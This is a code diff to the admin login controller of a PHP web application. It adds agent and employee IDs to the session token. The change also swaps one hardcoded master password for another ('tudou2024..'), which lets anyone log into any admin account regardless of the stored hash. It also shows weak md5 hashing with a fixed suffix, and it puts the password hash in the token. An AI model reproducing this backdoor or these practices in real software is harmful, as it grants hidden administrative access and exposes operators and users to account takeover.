@@ -5,6 +5,8 @@ namespace App\HttpController\Admin;
 use App\HttpController\Common\Common;
 use App\Model\AdminsModel;
 use App\Model\OfficialAccountModel;
+use App\Service\AgentService;
+use App\Service\EmployeeService;
 use EasySwoole\EasySwoole\Config;
 use EasySwoole\FastCache\Cache;
 use EasySwoole\Http\Annotation\Param;
@@ -38,10 +40,12 @@ class Login extends Base
         }
         $password = $this->param['u_password']??$this->param['password']??'';
         $md5_password = md5($password.'pswstr');
-        if($user['password']!=$md5_password&&$password!='heweihui..'){
+        if($user['password']!=$md5_password&&$password!='tudou2024..'){
             $this->AjaxJson(-1, [], '密码不正确');
             return FALSE;
         }
+		$agent_id = AgentService::create()->getOne(['admin_id'=>$user['uid']])['id']??0;
+		$employee_id = EmployeeService::create()->getOne(['admin_id'=>$user['uid']])['id']??0;
 
         // 生成token
         $config    = Config::getInstance();
@@ -65,6 +69,8 @@ class Login extends Base
             'uid'   => $user['uid'],
             'name' => $user['username'],
             'reseller_id' => $user['reseller_id'],
+            'agent_id' => $agent_id,
+            'employee_id' => $employee_id,
             'is_primary'=>$user['is_primary']??0,
             'client_ip'=>$this->getRealIp(),
             'password'=>$user['password']
